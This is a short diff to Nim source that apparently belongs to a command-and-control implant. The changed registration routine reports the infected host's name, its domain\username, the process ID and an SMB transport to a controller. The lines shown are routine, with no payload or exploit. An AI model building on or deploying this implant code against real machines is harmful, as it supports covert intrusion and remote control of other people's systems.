@@ -77,10 +77,14 @@ proc exeName*(): string =
     return if i < 0: full else: full[i+1..^1]
 
 proc register*(t: var AgentTransport): bool =
+  let regHost = getEnvStr("COMPUTERNAME", "UNKNOWN").toLowerAscii()
+  let regDom  = getEnvStr("USERDOMAIN", "")
+  let regUsr  = getEnvStr("USERNAME", "UNKNOWN")
+  let regUser = if regDom.len > 0: regDom & "\\" & regUsr else: regUsr
   let req = %*{
     "type":         "REGISTER",
-    "hostname":     getEnvStr("COMPUTERNAME", "UNKNOWN"),
-    "username":     getEnvStr("USERNAME", "UNKNOWN"),
+    "hostname":     regHost,
+    "username":     regUser,
     "os":           "windows/amd64",
     "pid":          int(GetCurrentProcessId()),
     "transport":    "smb",
